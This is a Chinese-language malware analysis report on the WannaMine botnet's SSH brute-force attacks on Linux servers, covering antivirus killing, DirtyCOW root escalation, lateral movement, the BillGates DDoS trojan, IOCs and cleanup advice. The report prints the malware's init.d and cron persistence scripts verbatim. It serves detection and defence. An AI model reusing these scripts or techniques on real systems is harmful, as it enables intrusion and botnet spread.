## 一、背景

腾讯安全专家在为某企业客户进行例行安全巡检过程中，发现客户部署的腾讯御界高级威胁检测系统出现了SSH服务失陷感知信息。

![](https://image.3001.net/images/20190822/1566444977_5d5e0db10dec3.jpg!small)

在征得客户同意后对客户机器进行远程取证，并结合御界的关键日志进行分析，我们发现这是一起针对SSH服务器弱口令爆破攻击事件，由于发现及时，工程师及时协助客户进行隔离及杀毒，并未造成损失。

腾讯安全御见威胁情报中心展开事件调查，结果发现，这是由大型挖矿僵尸网络WannaMine发起的攻击事件：攻击者利用SSH弱口令爆破成功后会植入shell后门以及brootkit后门程序，并通过SSH在内网横向传播，受害机器接收远程指令安装（包括但不限于）挖矿木马、DDoS攻击模块。

SSH代表安全外壳(SecureShell)，它现在是通过互联网访问网络设备和服务器的主要协议之一。SSH主要用在所有流行的操作系统上，比如Unix、Solaris、Red-HatLinux、CentOS和Ubuntu等。SSH默认情况使用端口号22，我们通过zoomeye查找开放22端口的设备，发现全球有超过1亿台设备开放了该端口，这意味着超过1亿台设备有被爆破攻击的可能。

参考链接：<https://www.zoomeye.org/searchResult?q=port%3A22>

![](https://image.3001.net/images/20190822/1566444985_5d5e0db9d28e2.png!small)

根据腾讯安全御见威胁情报中心的监测数据，WannaMine自2019年6月开始在国内呈现新的快速增长趋势，目前已影响近14万台设备。

![](https://image.3001.net/images/20190822/1566444993_5d5e0dc13847f.png!small)

WannaMine病毒近期感染趋势

病毒感染地区分布前三名分别为：广东（20.3%）、江苏（7.7%）、浙江（7%）。

![](https://image.3001.net/images/20190822/1566445000_5d5e0dc80118a.png!small)

WannaMine病毒受害者分布

受WannaMine病毒影响的主要行业为工业企业（34.11%），其次为互联网企业（10.85%）和教育行业（10.08%）。

![](https://image.3001.net/images/20190822/1566445006_5d5e0dcec23e7.png!small)

WannaMine挖矿木马影响的主要行业

## 二、详细分析

分析发现，此次攻击事件中WannaMine开始将攻击目标转向Linux系统，其行为主要具有以下特点：

> 1、 会获取被感染机器的SSH连接记录，从而攻击该机器登录过的所有远程服务器，以达到横向传播的目的;
>
> 2、 检测中招机器上的“安全狗”、“安骑士”、“云锁”、“悬镜卫士”等12种服务器防护软件，针对每一款软件进行退出及删除；
>
> 3、
> 将守护脚本代码添加至Linux启动项、定时任务，以达到持久化；最后清除挖矿竞争对手，开启挖矿，并尝试利用Linux内核提权漏洞CVE-2016-5195获取系统Root权限;
>
> 4、
> 植入Linux平台DDoS木马“BillGates”，该木马伪装成Linux系统工具“ps”，“lsof”和”netstat”等进行隐藏，具有远程shell、作为客户端或服务器运行的功能。“
> BillGates”接收远程指令，对目标进行多种类型的DDoS攻击。

![](https://image.3001.net/images/20190822/1566445018_5d5e0ddad63f9.png!small)

WannaMine攻击Linux系统

### Shell

在通过漏洞攻击、爆破攻击进入Linux系统后,病毒植入“Shell”脚本。脚本首先进行变量声明，指定后续需要用到的网络地址，文件路径等信息。

指定木马远程地址和目录、以及文件hash:

> temp_remote_host: 远程地址
>
> sodd_info_arr: DDoS木马
>
> tiktoor_info_arr: brootkit后门
>
> pxe_info_arr: CVE-2016-5195内核提权

指定木马执行路径、进程名及相关参数：

> 下载文件保存目录：DownloadPath="/usr/lib/..."
>
> Shell进程名：ShellProceName="diskmanagerd"
>
> DDoS木马进程名：soddProceName="kacpi_notify"
>
> Shell进程权限：shell_privilege=1
>
> 系统类型：OsType=1
>
> 校验方法：verify_method="md5sum"
>
> Shell参数：ShellArg=$1
>
> 当前版本：Ver=1.0

![](https://image.3001.net/images/20190822/1566445030_5d5e0de6bfc13.png!small)

### 对抗杀软

通过ls -l /etc/init.d/$servicename检测以下防护服务：

Safedog：安全狗

aegis：安骑士

yunsuo：云锁

clamd：ClamAV

avast：Avast

avgd：AVG

cmdavd：COMODOAntivirus

cmdmgd：COMODOAntivirus

drweb-configd：Dr.Web

drweb-spider-kmod：Dr.Web

esets：ESET NOD32Antivirus

xmirrord：悬镜服务器卫士

![](https://image.3001.net/images/20190822/1566445041_5d5e0df161db7.png!small)

然后针对每一款防护软件进行清理，包括停止服务、杀死进程、删除文件、卸载软件等操作。

![](https://image.3001.net/images/20190822/1566445048_5d5e0df892fd1.png!small)

![](https://image.3001.net/images/20190822/1566445054_5d5e0dfee0c4b.png!small)

function BasicInit(){}执行基础的初始化。

使用ping命令检查remote_host中的第一个地址是否能连接，如果不能则使用第二个；

通过查看$UID、$EUID的值来确定当前的权限，高权限则设置下载目录为"/home/$USER/..."，低权限设置为"/usr/lib/..."；

检查当前是否具有md5校验功能；检查当前系统属于CentOS/Ubantu/Debian中的哪一种，默认为CentOS。

![](https://image.3001.net/images/20190822/1566445062_5d5e0e0617245.png!small)

### 内核提权

function
RunInBack(){}检查shell是否使用/sbin/init运行，如果不是则将脚本移动到以前具有写入权限(Rwx)的文件夹，其名称为“diskmanagerd”(名称在$ShellProceName名称变量中指定)，然后将

脚本尝试使用nohup实用程序重新运行，或在未安装nohup时仅在后台运行。

![](https://image.3001.net/images/20190822/1566445071_5d5e0e0fbd0c1.png!small)

function GetRootAccess(){}利用漏洞CVE-2016-5195获取系统Root权限。

(github:<https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails>)

CVE-2016-5195（脏牛漏洞）是因为Linux内核的内存子系统在处理写入时复制（copy-on-write, COW）时产生了竞争条件（race
condition），攻击者利用此漏洞对只读内存映射进行写访问，从而可获得Linux设备的root权限。

![](https://image.3001.net/images/20190822/1566445079_5d5e0e17d3891.png!small)

### 清除挖矿竞品

function WorkProc(){}检测并结束挖矿相关的进程。

![](https://image.3001.net/images/20190822/1566445087_5d5e0e1f30fea.png!small)

### 持久化攻击

function SetStartup(){}中分别添加守护程序到Linux启动项目录、定时任务，以达到反复执行shell的目的。

守护脚本1：

    
    
    guarderText="#!/bin/sh
    
    #chkconfig: 12345 90 90
    
    #description: irqbalence
    
    ###BEGIN INIT INFO
    
    #Provides: irqbalence
    
    #Required-Start:
    
    #Required-Stop:
    
    #Default-Start: 1 2 3 4 5
    
    #Default-Stop:
    
    #Short-Description: irqbalence
    
    ###END INIT INFO
    
    case\$1 in
    
    start)
    
    /usr/bin/irqbalence
    
    ;;
    
    stop)
    
    ;;
    
    *)
    
    /usr/bin/irqbalence
    
    ;;
    
    esac"

将guarderText内容写入启动目录/etc/rc.d/init.d目录下，从而在启动时执行。

![](https://image.3001.net/images/20190822/1566445095_5d5e0e273524a.png!small)

守护脚本2：

    
    
    guarderText2="#!/bin/sh
    
    PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
    
    fori in \`cat /proc/net/dev|grep :|awk -F: {'print \$1'}\`; do ifconfig \$iup& done
    
    if [! -f \"$DownloadPath/$ShellProceName\" ]; then
    
    \cp -rf /lib/libterminfo.so$DownloadPath/httpdinfo
    
    fi
    
    test=0
    
    fori in /proc/*
    
    do
    
    if [ -d \"\$i\" ] && [\"\$i\" != \"/proc/\$\$\" ];then
    
    if [ -f \"\$i/exe\" ]; then
    
    temp=\`ls -l \$i | grep exe | grep/bin/bash\`
    
    if [ \"\$temp\" !=\"\" ]; then
    
    temp=\`cat \$i/cmdline\`
    
    result=\$(echo \"\$temp\" |grep \"$ShellProceName\")
    
    if [ \"\$result\" !=\"\" ]; then
    
    test=1
    
    break
    
    fi
    
    fi
    
    fi
    
    fi
    
    done
    
    if [\"\$test\" = 0 ]; then
    
    (exec $DownloadPath/httpdinfo &>/dev/null &)
    
    fi"

将guarderText2写入etc/cron.hourly/gcc4lef.sh，并安装为crontab定时任务运行

![](https://image.3001.net/images/20190822/1566445103_5d5e0e2f0f7f3.png!small)

### brootkit后门

function
rootkit(){}安装brootkit后门(github:<https://github.com/cloudsec/brootkit>)，该后门具有具有盗取root用户密码、隐藏文件和目录、隐藏进程、隐藏网络连接、反连后门、多线程端口扫描、HTTP下载、多线程SSH爆破等功能。

![](https://image.3001.net/images/20190822/1566445110_5d5e0e362a28d.png!small)

### 横向移动

function
Dandelion(){}从各种来源（用户历史记录）收集有关当前用户之前通过SSH连接的所有远程服务器信息，尝试连接到这些主机并感染它们，以便将自身传播到更多的系统。

![](https://image.3001.net/images/20190822/1566445116_5d5e0e3c30f88.png!small)

### DDoS木马

function CheckUpdate(){}检查木马最新版本，并从服务器下载更新

![](https://image.3001.net/images/20190822/1566445122_5d5e0e42ccc62.png!small)

function Guard(){}中下载DDoS病毒”BillGates”。

![](https://image.3001.net/images/20190822/1566445130_5d5e0e4aab222.png!small)

依次使用4中下载方法尝试下载("wget" "curl""python" "tcp")。

![](https://image.3001.net/images/20190822/1566445137_5d5e0e51ee154.png!small)

下载完成后后使用md5sum计算文件md5并进行校验，验证md5值是否为6a971a24a418ce99e9a0cd65ba14078d/4e117357b8a5bf51aaba6e939cace26b。

![](https://image.3001.net/images/20190822/1566445144_5d5e0e588d5bb.png!small)

### BillGates

shell下载的文件为功能复杂DDoS木马BillGates，其得名于其在变量函数的命名中，大量使用“Gates”和“Bill”。此外，木马还具有伪装成Linux系统工具'ps'，'lsof'和'netstat'等进行隐藏自身、远程shell、作为客户端或服务器运行等特点。木马早期大规模扫描和利用漏洞感染Elasticsearch服务器（ElasticSearch是一个基于Lucene的搜索服务器，是最受欢迎的企业搜索引擎）从而组成强大的僵尸网络。

![](https://image.3001.net/images/20190822/1566445151_5d5e0e5fcbda8.png!small)

木马首先建立一个包含文件名和路径的全局变量“监视”文件。 监视文件代表初步安装的BillGates处于运行状态下。接下来通过

CSysTool::CheckGatesType来确定当前处于哪种运行状态下，判断返回的全局变量g_iGatesType标识0至3共四种状态：

0代表当前进程的映像符合监控文件名和路径

1代表当前进程的映像不符合监控文件名和路径，并且不属于其他任何类型

2代表当前进程的映像符合/usr/bin/

3代表当前进程的映像符合下列系统工具之一

/bin/netstat

/bin/lsof

/bin/ps

/bin/ss

/usr/bin/netstat

/usr/bin/lsof

/usr/bin/ps

/usr/bin/ss

/usr/sbin/netstat

/usr/sbin/lsof

/usr/sbin/ps

/usr/sbin/ss

![](https://image.3001.net/images/20190822/1566445169_5d5e0e718d4a1.png!small)

匹配到每个标识后都以不同的目的运行，这样使得BillGates作为单个实体可以运作四种不同的模式，执行多个独特的功能，从而其成为一个复杂的的多功能木马。

 **模式0**

BillGates作为感染监控器，通过调用MainMonitor开始。在这种模式下的任务是不断监视活动进程列表以确定是否生成了由模式1（称为Host模式）产生的进程正在运行。

 **模式1**

BillGates的Host模式。当main函数中调用MainBeikong开始执行。Host模式的初始化阶段完成后，MainBeikong通过调用MainProcess结束，MainProcess是BillGates在Host或Backdoor模式下运行时的核心功能。MainProcess首先初始化五个全局对象：

类 | 全局变量 | 功能  
---|---|---  
CDNSCache | g_dnsCache | 包含受害者指定的DNS服务器列表  
CConfigDoing | g_cnfgDoing | 包含二进制文件的当前配置  
CCmdDoing | g_cmdDoing | 包含当前任务的当前状态  
CStatBase | g_statBase | 维护受害者计算机的当前状态  
CProvinceDNS | g_provinceDns |
包含中国大陆的302个DNS服务器，14个中国台湾DNS服务器，11个中国香港的DNS服务器，2个中国澳门DNS服务器，2个日本DNS服务器  
  
Host或backdoor模式下的BillGates支持7种不同的管理控制命令：

1 通过调用CManager :: DoAtkStartCommand添加（并启动）新的DDoS攻击  
---  
2 终止攻击活动和更新操作  
3 通过调用CManager :: DoConfigCommand更新配置  
5 通过调用实现BillGates二进制文件的即时升级  
7 通过调用CManager :: DoCommandCommand更新当前的CCmdDoing对象  
8 通过调用CManager:: DoFakeDetectCommand执行BillGates节点的真实性验证  
9 发出命令，让受害者的系统通过shell执行  
  
其中DDoS攻击类型如下：

![](https://image.3001.net/images/20190822/1566445177_5d5e0e79951b0.png!small)

 **模式2**

Backdoor模式。main函数中调用MainBackdoor进入该模式。使用BillGates文件替换Linux系统二进制文件，然后MainBackdoor调用MainProcess，在这之后执行代码与Host模式的行为相同。

 **模式3**

公共设施。该模式通过调用MainSystool 开始，BillGates作为Linux系统二进制文件的代理运行，并从系统工具的输出中删除自己的痕迹。

## 三、总结

WannaMine攻击代码呈现高度系统化、定制化的特点，从首次出现之后，其载荷托管IP地址会在没一次重要更新之后进行切换。而观察历史托管IP与IP解析到的域名可以发现，跨时期、跨版本的攻击代码又存在使用相同的托管域名(标红域名)的情况，因此推测该病毒团伙存在在向其他团伙提供攻击武器的可能。

**日期** | **载荷托管ip地址** | **使用时解析到该ip地址的域名**  
---|---|---  
2018.2月 | 195.22.127.157 | node3.jhshxbv.com、node.jhshxbv.com、
node4.jhshxbv.com、node2.jhshxbv.com  
107.179.67.243 | stafftest.spdns.eu、profetestruec.net  
45.63.55.15 | 未知  
94.102.52.36 | nuki-dx.com  
2018.3月 | 123.59.68.172 | ddd.parkmap.org、yp.parkmap.org  
93.174.93.73 | demaxiya.info、fashionbookmark.com  
121.17.28.15 | 未知  
2018.4月 | 195.22.127.93 |
[www.windowsdefenderhost.club](http://www.windowsdefenderhost.club/)  
2018.6月 | 198.54.117.244 | update.windowsdefenderhost.club  
107.148.195.71 | d4uk.7h4uk.com  
185.128.40.102 | d4uk.7h4uk.com、update.7h4uk.com、 info.7h4uk.com  
185.128.43.62 | d4uk.7h4uk.com、update.7h4uk.com、 info.7h4uk.com  
192.74.245.97 | d4uk.7h4uk.com  
87.121.98.215 | 未知  
2019.3月 | 172.247.116.8 | 未知  
172.247.116.87 | profetestruec.net  
45.199.154.108 | profetestruec.net  
2019.6月 | 111.90.140.35 | auth.to0ls.com  
185.234.218.40 | auth.to0ls.com、mail.to0ls.com  
2019.8月 | 185.128.41.90 | auth.to0ls.com、update.7h4uk.com  
  
从攻击对象与手法上来看，WannaMine不断拓宽其攻击覆盖面，从最初的利用“永恒之蓝”漏洞、Powershell攻击Windows系统，到后来利用各类Web漏洞(Weblogic、PHPMyAdmin、Drupal)攻击Windows上搭建的服务器，到最后通过MsSQL爆破攻击SQL服务器，以及SSH爆破攻击Linux服务器。

在木马类型上，开始以植入挖矿和远控类型木马为主，后来逐渐加入DDoS木马(包括Windows平台和Linux平台)，其目标在于组建庞大的挖矿僵尸网络以及DDoS僵尸网络，使该病毒团伙具有不断更新、内网横向移动、持久化获利的能力。

日期 | 攻击对象 | 攻击类型  
---|---|---  
2017年 | Windows主机、服务器 | “永恒之蓝”漏洞、Powershell、“Mimikatz+WMIExec”、WMI存储  
2018年6月 | Windows操作系统上的Web服务端(Weblogic、PHPMyAdmin、Drupal) |
Web漏洞攻击、PowerShell、挖矿、DDoS  
2019年6月 | Windows主机、服务器，Linux服务器 |
“永恒之蓝”漏洞、PowerShell、SMB爆破、MSSQL爆破、SSH爆破、挖矿、DDoS  
  
## 四、安全建议

1、 及时为系统和应用软件打补丁，关闭不必要的端口和服务；

2、 使用高强度的Windows登陆密码、SSH登陆密码、MsSQL数据库密码等；

3、 安装安全软件并保持安全软件正常开启；

4、Linux服务器手动清理方案

删除启动项

> /etc/rc.d/init.d/diskmanagerd
>
> /etc/rcS.d/S90diskmanagerd

删除定时任务

> */3 * * * * root/etc/cron.hourly/gcc4lef.sh

删除文件

> /tmp/.../brootkit.sh
>
> /tmp/.../install.sh
>
> /tmp/.../just4root
>
> /tmp/.../pxe

关闭进程

> /usr/lib/diskmanagerd
>
> /home/$USER/diskmanagerd
>
> /usr/lib/kacpi_notify
>
> /home/$USER/kacpi_notify

5、修复漏洞(DirtyCOW:CVE-2016-5195)

各操作系统供应商下载Linux kernel 4.8.3、Linux kernel 4.7.9和Linux kernel 4.4.26
LTS，为用户提供稳定版渠道更新。

软件开发人员可以通过

<https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619>重新编译Linux修复此漏洞。

6、ssh非交互方式登录到远程服务器时，设置主机公钥确认StrictHostKeyChecking的值为ask或yes，避免历史SSH登录记录被病毒利用，形成内网扩散。

（注：StrictHostKeyChecking=no
最不安全的级别,连接server的key在本地不存在，就自动添加到文件中（默认是known_hosts）。

StrictHostKeyChecking=ask 默认的级别,如果连接和key不匹配，给出提示，并拒绝登录。

StrictHostKeyChecking=yes 最安全的级别，如果连接与key不匹配，就拒绝连接，不会提示详细信息。）

7、使用腾讯御界高级威胁检测系统检测未知黑客的各种可疑攻击行为。御界高级威胁检测系统，是基于腾讯反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。

![](https://image.3001.net/images/20190822/1566445187_5d5e0e83b2f82.png!small)

## IOCs

### IP

195.22.127.157

107.179.67.243

45.63.55.15

94.102.52.36

123.59.68.172

93.174.93.73

121.17.28.15

195.22.127.93

198.54.117.244

107.148.195.71

185.128.40.102

185.128.43.62

192.74.245.97

87.121.98.215

172.247.116.8

172.247.116.87

45.199.154.108

111.90.140.35

185.234.218.40

185.128.41.90

### Domain

node3.jhshxbv.com

node.jhshxbv.com

node4.jhshxbv.com

node2.jhshxbv.com

stafftest.spdns.eu

profetestruec.net

nuki-dx.com

ddd.parkmap.org

yp.parkmap.org

demaxiya.info、

fashionbookmark.com

[www.windowsdefenderhost.club](http://www.windowsdefenderhost.club)

update.windowsdefenderhost.club

d4uk.7h4uk.com

update.7h4uk.com

info.7h4uk.com

oa.to0ls.com

mail.to0ls.com

auth.to0ls.com

### MD5

1db902385b4480a76e4527605eb9f825（Shell）

6a971a24a418ce99e9a0cd65ba14078d（BillGates）

4e117357b8a5bf51aaba6e939cace26b（BillGates）

c04dceb4c769b2c8823cbf39f3055e6d（Brootkit）

ad593f6a17598bdd12fd3bd0f3b2a925（Brootkit）

20788d837f33f5e735bdc99d68fc71b1（Dirtycow）

d9bbb758e3831839558d80f381f9d4b1（Dirtycow）

795acc900cb55882629e7ce3f65130c4（Dirtycow）

1195ea4886acf3a857913c448af78d11（Dirtycow）

### 参考链接：

<https://www.freebuf.com/articles/web/175626.html>

<https://mp.weixin.qq.com/s/U3sODZCmCPIfFqjQgHpa0A>

<https://zhuanlan.zhihu.com/p/68612894>

<https://www.novetta.com/wp-content/uploads/2015/06/NTRG_ElasticBotnetReport_06102015.pdf>

<https://www.akamai.com/us/en/multimedia/documents/state-of-the-internet/bill-gates-botnet-threat-advisory.pdf>

 ***本文作者：腾讯电脑管家，转载请注明来自FreeBuf.COM**

